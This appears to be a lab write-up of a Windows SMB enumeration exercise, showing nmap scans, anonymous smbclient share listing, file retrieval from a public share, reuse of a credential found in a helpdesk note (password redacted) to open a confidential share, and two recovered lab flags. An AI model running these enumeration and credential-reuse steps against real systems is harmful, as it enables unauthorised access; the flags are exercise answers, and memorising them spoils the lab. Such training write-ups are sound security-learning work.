# Red Nexus — Windows SMB Enumeration

**Platform:** Red Nexus Windows Lab  
**Category:** Windows / SMB Enumeration  
**Difficulty:** Not specified  
**Status:** In Progress

## Objective

Enumerate the SMB service on the lab host, identify accessible shares, and retrieve files exposed through the public share.

## Initial Information

- Target: `10.13.41.21`
- Service of interest: SMB over TCP/445
- Lab hostname reported by Nmap: `win_smb.red-nexus-windows_labnet`

## Approach

### 1. Confirm SMB is reachable

The first command had a missing space between the port and IP address:

```bash
nmap -p44510.13.41.21
```

Corrected command:

```bash
nmap -p445 10.13.41.21
```

Result: TCP/445 was open.

### 2. Run default scripts

```bash
nmap -p445 -sC 10.13.41.21
```

Relevant observations:

- SMB was reachable.
- Nmap reported the NetBIOS name as `RN-DC01`.
- The SMB OS discovery script reported `Windows 6.1 (Samba 4.19.9)`.
- The output indicated that SMB signing was enabled but not required in one script result; another SMB security script reported signing disabled. Treat this as an observation to verify, not a final conclusion.

The reported OS fingerprint and Samba version should not be treated as proof of the underlying operating system.

### 3. Check for the specific MS17-010 finding

```bash
nmap -p445 --script smb-vuln-ms17-010 10.13.41.21
```

The scan returned no vulnerability result. Therefore, **MS17-010 was not confirmed** by this check. The flag filename or wording alone is not evidence that the host is vulnerable.

### 4. Enumerate available shares

```bash
smbclient -N -L //10.13.41.21
```

The server listed these shares:

- `public`
- `confidential`
- `IPC$`

The `-N` option attempts a connection without prompting for a password. The listing showed that share names could be enumerated without supplying credentials; it did not prove that every share was anonymously readable.

### 5. Inspect the public share

```bash
smbclient -N //10.13.41.21/public
```

Inside the SMB client, I ran:

```text
ls
```

The share contained:

- `helpdesk_notes.txt`
- `SYSTEM_loot.txt`

I initially tried `cat` inside the SMB client, but that is a local shell command, not an smbclient command. I used `get` to download the file:

```text
get SYSTEM_loot.txt
exit
```

Then I read it from the local shell:

```bash
cat SYSTEM_loot.txt
```

The file contained the lab flag:

```text
redNexus{smb_eternalblue_ms17_010_loot}
```

I also read the helpdesk note directly to standard output:

```bash
smbclient -N //10.13.41.21/public -c "get helpdesk_notes.txt -"
```

It contained a username and password. **The password is intentionally redacted from this public write-up.** A credential appearing in a note is not proof that it is valid or that the account has administrative privileges.

### 6. Authenticate to the confidential share

The first authentication attempt failed with `NT_STATUS_LOGON_FAILURE`. The password is case-sensitive; the corrected capitalization succeeded. The credential itself is intentionally **not reproduced** in this public write-up.

The first attempt to open the host also omitted the share name. The valid service path includes both host and share:

```bash
smbclient -U 'rnadmin' //10.13.41.21/confidential
```

I then listed the directory:

```text
ls
```

It contained `admin_flag.txt`. My first `get` attempt used the misspelled name `amdin_flag.txt` and returned `NT_STATUS_OBJECT_NAME_NOT_FOUND`. Using the exact filename succeeded:

```text
get admin_flag.txt
exit
```

I read the downloaded file locally and recovered this lab flag:

```text
redNexus{authenticated_smb_access_psexec}
```

**Scope of this result:** this confirms authenticated access to the `confidential` SMB share and retrieval of its file. It does **not** by itself prove that a PsExec session was established or that remote command execution succeeded. Those steps remain unverified.

## Commands and Tools

Commands actually used:

```bash
nmap -p445 10.13.41.21
nmap -p445 -sC 10.13.41.21
nmap -p445 --script smb-vuln-ms17-010 10.13.41.21
nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 10.13.41.21
smbclient -N -L //10.13.41.21
smbclient -N //10.13.41.21/public
```

Useful smbclient commands:

```text
ls
get SYSTEM_loot.txt
exit
```

## Findings

- TCP/445 was open.
- The server exposed the share names `public`, `confidential`, and `IPC$`.
- The `public` share was accessible without credentials.
- The public share contained a lab flag file and a helpdesk note.
- The helpdesk note exposed a username and password; the password is redacted here.
- The `confidential` share was accessible using the authorized `rnadmin` lab account; `admin_flag.txt` was retrieved.
- The authenticated-share flag was recovered. A PsExec session or remote execution has not yet been demonstrated.
- MS17-010 was not confirmed by the Nmap vulnerability script.

## Result

Recovered lab flag:

```text
redNexus{smb_eternalblue_ms17_010_loot}
```

## What I Learned

- Use a space between Nmap options and their values.
- TCP/445 is the standard SMB port.
- `smbclient -N -L` can enumerate share names without prompting for a password.
- Share enumeration and share access are different checks.
- Inside smbclient, use `get` to download a file; use local shell commands after exiting.
- Credentials found in files should be handled carefully and must be validated in the authorized lab.
- A flag mentioning a vulnerability does not prove that the target is vulnerable.

## Takeaway

The confidential-share access check is complete. If the exercise requires PsExec, the next step is to verify that capability separately in the authorized lab and document only the observed session/result. Do not equate successful SMB file access with PsExec execution.
